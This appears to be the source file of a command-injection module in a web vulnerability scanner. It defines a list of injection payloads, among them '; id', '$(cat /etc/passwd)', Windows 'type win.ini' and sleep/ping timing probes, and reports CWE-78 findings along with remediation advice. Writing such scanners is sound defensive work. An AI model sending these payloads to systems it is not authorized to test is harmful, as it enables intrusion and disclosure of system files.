# scanner/injection/cmdi.py
"""Command Injection Scanner"""

import re
import asyncio
from typing import List, Dict, Optional
import aiohttp

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class CommandInjectionScanner(BaseScanner):
    """Scanner for OS Command Injection vulnerabilities"""
    
    name = "Command Injection Scanner"
    description = "Detects OS command injection vulnerabilities"
    owasp_category = OWASPCategory.A03_INJECTION
    
    # Command injection payloads
    PAYLOADS = [
        # Unix command separators
        ('; id', 'unix', 'uid='),
        ('| id', 'unix', 'uid='),
        ('|| id', 'unix', 'uid='),
        ('& id', 'unix', 'uid='),
        ('&& id', 'unix', 'uid='),
        ('`id`', 'unix', 'uid='),
        ('$(id)', 'unix', 'uid='),
        
        # Unix cat /etc/passwd
        ('; cat /etc/passwd', 'unix', 'root:'),
        ('| cat /etc/passwd', 'unix', 'root:'),
        ('`cat /etc/passwd`', 'unix', 'root:'),
        ('$(cat /etc/passwd)', 'unix', 'root:'),
        
        # Windows command separators
        ('& whoami', 'windows', '\\'),
        ('| whoami', 'windows', '\\'),
        ('|| whoami', 'windows', '\\'),
        
        # Windows type
        ('& type C:\\Windows\\win.ini', 'windows', '[extensions]'),
        ('| type C:\\Windows\\win.ini', 'windows', '[extensions]'),
        
        # Newline injection
        ('%0aid', 'unix', 'uid='),
        ('%0d%0aid', 'unix', 'uid='),
        
        # Encoded payloads
        ('%3Bid', 'unix', 'uid='),  # ; encoded
        ('%7Cid', 'unix', 'uid='),  # | encoded
        
        # Time-based (blind)
        ('; sleep 5', 'time', None),
        ('| sleep 5', 'time', None),
        ('`sleep 5`', 'time', None),
        ('$(sleep 5)', 'time', None),
        ('& ping -c 5 127.0.0.1', 'time', None),  # Unix
        ('& ping -n 5 127.0.0.1', 'time', None),  # Windows
    ]
    
    # Parameters likely vulnerable to command injection
    CMDI_PARAM_PATTERNS = [
        r'cmd', r'exec', r'command', r'execute',
        r'ping', r'query', r'host', r'ip',
        r'port', r'file', r'path', r'dir',
        r'folder', r'log', r'daemon', r'upload',
        r'download', r'email', r'to', r'from',
        r'proc', r'process', r'action', r'do',
        r'run', r'start', r'begin', r'func',
    ]
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for command injection vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        for param_name, param_value in params.items():
            # Prioritize likely vulnerable parameters
            is_likely_vuln = self._is_likely_vulnerable(param_name)
            
            vuln = await self._test_parameter(
                session, url, params, param_name, is_likely_vuln
            )
            if vuln:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _is_likely_vulnerable(self, param_name: str) -> bool:
        """Check if parameter name suggests command execution"""
        param_lower = param_name.lower()
        return any(re.search(p, param_lower) for p in self.CMDI_PARAM_PATTERNS)
    
    async def _test_parameter(self, session: aiohttp.ClientSession,
                               url: str, params: Dict[str, str],
                               param_name: str, is_priority: bool) -> Optional[Vulnerability]:
        """Test a parameter for command injection"""
        
        # Test payloads (prioritize non-time-based for speed)
        payloads_to_test = self.PAYLOADS if is_priority else self.PAYLOADS[:10]
        
        for payload, os_type, evidence_pattern in payloads_to_test:
            test_params = params.copy()
            test_params[param_name] = params.get(param_name, '') + payload
            
            # Time-based detection
            if os_type == 'time':
                vuln = await self._test_time_based(
                    session, url, test_params, param_name, payload
                )
                if vuln:
                    return vuln
                continue
            
            # Regular detection
            response = await self.make_request(session, "GET", url, params=test_params)
            if not response:
                continue
            
            body = await response.text()
            
            # Check for evidence
            if evidence_pattern and evidence_pattern in body:
                return self.create_vulnerability(
                    vuln_type="OS Command Injection",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Command output detected in response: '{evidence_pattern}' found",
                    description=f"The application is vulnerable to {os_type.upper()} command injection. Arbitrary system commands can be executed.",
                    cwe_id="CWE-78",
                    cvss_score=9.8,
                    remediation="Never pass user input to system commands. Use safe APIs that don't invoke shell commands. If unavoidable, use strict input validation and parameterization.",
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection",
                        "https://cwe.mitre.org/data/definitions/78.html"
                    ]
                )
        
        return None
    
    async def _test_time_based(self, session: aiohttp.ClientSession,
                                url: str, params: Dict[str, str],
                                param_name: str, payload: str) -> Optional[Vulnerability]:
        """Test for time-based blind command injection"""
        
        try:
            start_time = asyncio.get_event_loop().time()
            
            response = await self.make_request(session, "GET", url, params=params)
            
            elapsed = asyncio.get_event_loop().time() - start_time
            
            # If response took significantly longer (> 4 seconds for 5 second sleep)
            if elapsed > 4:
                return self.create_vulnerability(
                    vuln_type="OS Command Injection (Time-based Blind)",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Response delayed by {elapsed:.2f} seconds (expected ~5s)",
                    description="The application is vulnerable to blind command injection. The injected sleep/ping command caused a measurable delay.",
                    cwe_id="CWE-78",
                    cvss_score=9.8,
                    remediation="Never pass user input to system commands. Use safe APIs and strict input validation.",
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection",
                        "https://cwe.mitre.org/data/definitions/78.html"
                    ]
                )
        except asyncio.TimeoutError:
            # Timeout might indicate successful injection
            return self.create_vulnerability(
                vuln_type="Potential OS Command Injection (Timeout)",
                severity=Severity.HIGH,
                url=url,
                parameter=param_name,
                payload=payload,
                evidence="Request timed out - possible command injection",
                description="The request timed out when testing for command injection, which may indicate successful injection.",
                cwe_id="CWE-78",
                cvss_score=7.5,
                remediation="Investigate this parameter for command injection vulnerabilities.",
                references=[
                    "https://owasp.org/www-community/attacks/Command_Injection"
                ]
            )
        
        return None